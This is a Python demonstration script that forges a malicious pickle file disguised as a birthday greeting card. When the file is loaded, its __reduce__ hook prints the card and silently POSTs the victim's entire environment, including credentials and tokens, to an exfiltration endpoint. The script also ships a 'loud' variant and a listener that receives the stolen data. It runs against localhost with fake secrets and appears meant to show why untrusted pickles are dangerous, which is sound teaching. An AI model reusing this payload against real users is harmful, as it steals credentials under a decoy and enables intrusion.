import io
import json
import os
import pickle
import pickletools
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib import request

import fire

EXFIL_URL = "http://127.0.0.1:8000/exfil"
CAPTURED = Path("tmp/exfil_captured.json")
RECIPIENT = "Ankush"

VICTIM_ENV = {
    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "GITHUB_TOKEN": "ghp_this_is_a_demo_token_1234567890abcdef",
    "DB_PASSWORD": "s3cr3t-prod-password",
    "SLACK_WEBHOOK": "https://hooks.slack.com/services/T000/B000/xxxx",
}


def _deliver_card(name=RECIPIENT):
    """The decoy behaviour: prints the greeting card the recipient expects.
    Nobody looks twice at a pickle that shows a birthday card — and that is
    precisely the cover under which the env vars are shipped away."""
    W = 36

    def line(t: str) -> str:
        return f"  ║{t:^{W}}╥".replace("╥", "║")
    card = "\n".join(
        [
            f"  ╔{'═' * W}╗",
            line("H A P P Y   B I R T H D A Y"),
            line(name),
            line("Hope your year is full of"),
            line("clean code & fast GPUs"),
            f"  ╚{'═' * W}╝",
        ]
    )
    print(card)

    # and, hidden in the same call, harvest + exfiltrate:
    stolen = dict(os.environ)
    body = json.dumps(
        {
            "hostname": os.uname().nodename if hasattr(os, "uname") else "win",
            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "pid": os.getpid(),
            "captured_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "env": stolen,
        },
        indent=2,
    ).encode()
    req = request.Request(EXFIL_URL, data=body, headers={"Content-Type": "application/json"})
    with request.urlopen(req, timeout=10):
        pass


def _send_env():
    """Standalone exfil only — the payload when you want the 'loud' variant."""
    stolen = dict(os.environ)
    req = request.Request(EXFIL_URL, data=json.dumps(stolen).encode(),
                          headers={"Content-Type": "application/json"})
    with request.urlopen(req, timeout=10) as resp:
        return f"  ⚠️  exfiltrated {len(stolen)} env vars (HTTP {resp.status})\n"


class GreetingCard:
    """A pickle that *looks* like it just renders a card.
    __reduce__ names one function; pickle.loads() unconditionally CALLS it.
    That invocation is the vulnerability — the 'decoy behaviour' is what
    lets the real work ride along unnoticed."""

    def __reduce__(self):
        return (_deliver_card, (RECIPIENT,))


class EnvBomb:
    """Loud variant: __reduce__ names a bare exfiltration callable."""

    def __reduce__(self):
        return (_send_env, ())


class _Handler(BaseHTTPRequestHandler):
    server: "_AttackerServer"
    rbufsize = 0  # default 64KB cap would swallow payloads larger than this

    def shutdown_request(self):
        pass

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self.server.last_captured = body
        CAPTURED.write_bytes(body)
        print(f"\n[attacker] POST {self.path} — {length} bytes")
        print("[attacker] payload captured ->", CAPTURED, "\n")
        try:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        except Exception:
            pass

    def log_message(self, *args):
        pass


class _AttackerServer(ThreadingHTTPServer):
    last_captured: bytes | None = None


def attacker(port=8000, wait_seconds=300):
    """Attacker side: listen for the exfiltration POST and print it.
    Run this in a separate terminal:  python3 rogue_pickle_demo.py attacker"""
    if CAPTURED.exists():
        CAPTURED.unlink()
    srv = _AttackerServer(("127.0.0.1", port), _Handler)
    print(f"[attacker] listening on http://127.0.0.1:{port}/exfil")
    print("[attacker] waiting for victim to load the rogue pickle ...")
    srv.timeout = 1
    deadline = time.time() + wait_seconds
    while srv.last_captured is None and time.time() < deadline:
        srv.handle_request()
    if srv.last_captured is not None:
        print("\n================ CAPTURED ENVIRONMENT ================")
        print(srv.last_captured.decode())
        print("=" * 57)
    else:
        print("[attacker] timed out, nothing captured")
    return srv.last_captured is not None


def create(output="tmp/greeting_card.pkl", loud=False):
    """Forge the pickle. `loud=False` -> innocent-looking card renderer with a
    side-channel; loud=True -> a bare exfil callable (obvious in the disassembly)."""
    obj = EnvBomb() if loud else GreetingCard()
    payload = pickle.dumps(obj)
    out = Path(output)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(payload)
    print(f"wrote {len(payload)} bytes -> {out}")
    print("\n-- what a reviewer sees in the disassembly --")
    buf = io.StringIO()
    pickletools.dis(payload, out=buf)
    print(buf.getvalue())
    return out


def load(path="tmp/greeting_card.pkl", recipient=RECIPIENT):
    """Victim side: receives the 'card', opens it. Everything looks expected.
    We first seed realistic creds into the env — that's what actually leaks."""
    os.environ.update(VICTIM_ENV)
    print(f"received {Path(path).name} from a colleague — opening it...\n")
    pickle.loads(Path(path).read_bytes())
    time.sleep(0.5)
    if CAPTURED.exists():
        print(f"  (meanwhile, attacker's capture file on disk: {CAPTURED})")
    return True


if __name__ == "__main__":
    fire.Fire({"attacker": attacker, "create": create, "load": load})
